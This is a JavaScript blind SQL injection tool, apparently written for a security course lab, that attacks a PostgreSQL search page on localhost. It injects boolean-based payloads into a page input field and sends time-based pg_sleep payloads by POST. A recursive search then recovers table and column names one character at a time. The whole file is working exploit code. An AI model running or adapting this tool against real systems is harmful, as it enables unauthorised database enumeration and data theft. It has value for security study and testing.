
  // ricerca ricorsiva
  function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}


async function findTablesVisible(prefix, equal) {   // returns true if a table's name starts with the substring analizing the result
    if (!equal){
        prefix = await prefix.replace(/_/g, "\\_")
        query =  "' OR (select COUNT(table_name) > 0  from information_schema.tables where table_name LIKE '"+prefix+"%' AND table_schema != 'pg_catalog' AND table_schema != 'information_schema'); -- "
    }
    else{
        query =  "' OR (select COUNT(table_name) > 0  from information_schema.tables where table_name = '"+prefix+"' AND table_schema  != 'pg_catalog' AND table_schema  != 'information_schema'); -- "
    }
    var inputElement = document.getElementById("article_name");
    inputElement.value = query;
    var event = new KeyboardEvent('keyup', {
        bubbles: true,
        cancelable: true,
        key: prefix.charAt(query.length - 1)
    });
    inputElement.dispatchEvent(event); // Recalls the keyup event
    await sleep(200);
    if (document.querySelectorAll('tr').length > 1) {
        return true;
    }
    else{
        return false;
    }
}


async function findAttributesVisible(prefix, equal, table_name) {   // returns true if an attribute's of a particular table starts with the substring analizing the result
    if (!equal){
        prefix = await prefix.replace(/_/g, "\\_")
        query =  "' OR (SELECT COUNT(*) > 0 FROM information_schema.columns WHERE table_name = '"+table_name+"' AND column_name LIKE '"+prefix+"%'); -- "
    }
    else{
        query =  "' OR (SELECT COUNT(*) > 0 FROM information_schema.columns WHERE table_name = '"+table_name+"' AND column_name = '"+prefix+"'); -- "
    }
    var inputElement = document.getElementById("article_name");
    inputElement.value = query;
    var event = new KeyboardEvent('keyup', {
        bubbles: true,
        cancelable: true,
        key: prefix.charAt(query.length - 1)
    });
    inputElement.dispatchEvent(event); 
    await sleep(200);
    if (document.querySelectorAll('tr').length > 1) {
        return true;
    }
    else{
        return false;
    }
}



async function findTablesTiming(prefix, equal) {   // returns true if a table's name starts with the substring analizing the result

    if (!equal){
        prefix = await prefix.replace(/_/g, "\\_")
        query = "' ; SELECT CASE WHEN (select COUNT(table_name) > 0  from information_schema.tables where table_name LIKE '"+prefix+"%' AND table_schema != 'pg_catalog' AND table_schema != 'information_schema') THEN pg_sleep(1) ELSE pg_sleep(0) END;--"
    }
    else{
        query = "' ; SELECT CASE WHEN (select COUNT(table_name) > 0  from information_schema.tables where table_name = '"+prefix+"' AND table_schema != 'pg_catalog' AND table_schema != 'information_schema') THEN pg_sleep(1) ELSE pg_sleep(0) END;--"
    }

    const startTime = new Date().getTime();

    const response = await fetch('http://localhost/Sicurezza/critical/search.php', { // the request address is visible in network section in the browser
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',  
        },
        body: new URLSearchParams({
            'name': query
        })
    });
    
    const endTime = new Date().getTime();
    const duration = endTime - startTime;
    
    if (duration > 1000) {
        console.log(prefix)
        return true
    }
    else{
        return false
    }
}


async function findAttributesTiming(prefix, equal) {   // returns true if a table's name starts with the substring analizing the result

    if (!equal){
        prefix = await prefix.replace(/_/g, "\\_")
        query = "' ; SELECT CASE WHEN (SELECT COUNT(*) > 0 FROM information_schema.columns WHERE table_name = '"+table_name+"' AND column_name LIKE '"+prefix+"%') THEN pg_sleep(1) ELSE pg_sleep(0) END;--"
    }
    else{
        query = "' ; SELECT CASE WHEN (SELECT COUNT(*) > 0 FROM information_schema.columns WHERE table_name = '"+table_name+"' AND column_name = '"+prefix+"') THEN pg_sleep(1) ELSE pg_sleep(0) END;--"
    }

    const startTime = new Date().getTime();

    const response = await fetch('http://localhost/Sicurezza/critical/search.php', { // the request address is visible in network section in the browser
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',  
        },
        body: new URLSearchParams({
            'name': query
        })
    });
    
    const endTime = new Date().getTime();
    const duration = endTime - startTime;

    if (duration > 1000) {
        return true
    }
    else{
        return false
    }
}


async function tableStartsWith(prefix, equal, visible){
    if (visible){
        return await findTablesVisible(prefix, equal);
    }else{
        return await findTablesTiming(prefix, equal);
    }
}

async function attributeStartsWith(prefix, equal, table_name, visible){
    if (visible){
        return await findAttributesVisible(prefix, equal, table_name);
    }else{
        return await findAttributesTiming(prefix, equal, table_name);
    }
}

// principal function
async function blindInjetion(mode, visible=true, table_name="") {  // mode=0 to discover table name, mode=1 to discover attributes names of a particular table
    const start = new Date().getTime();
    const alphabet = "abcdefghijklmnopqrstuvwxyz-_";
    let foundWords = new Set();

    async function recurse(prefix) {
        is_foglia = true
        for (let i = 0; i < alphabet.length; i++) {
            let newPrefix = prefix + alphabet[i];
            if (mode == 0) {
                if (await tableStartsWith(newPrefix, equal=false, visible)) {   // controllo se inizia per
                    if (await tableStartsWith(newPrefix, equal=true, visible)) { // controllo se la tabella si chiama proprio così
                        foundWords.add(newPrefix);
                        console.log(newPrefix)
                    }
                    await recurse(newPrefix);
                }
            }
            else if (mode==1){
                if (await attributeStartsWith(newPrefix, equal=false, table_name, visible)) {   // controllo se inizia per
                    if (await attributeStartsWith(newPrefix, equal=true, table_name, visible)) { // controllo se la tabella si chiama proprio così
                        foundWords.add(newPrefix);
                        console.log(newPrefix)
                    }
                    await recurse(newPrefix);
                }
            }
            
        }
        return
    }
    
    await recurse('');

    const end = new Date().getTime();
    const total_duration = end - start;
    // Stampa tutte le parole trovate
    console.log("Parole trovate:", Array.from(foundWords), " in "+total_duration/1000 +" seconds");
  }
  
  blindInjetion(mode=1, visible=false, table_name='address');


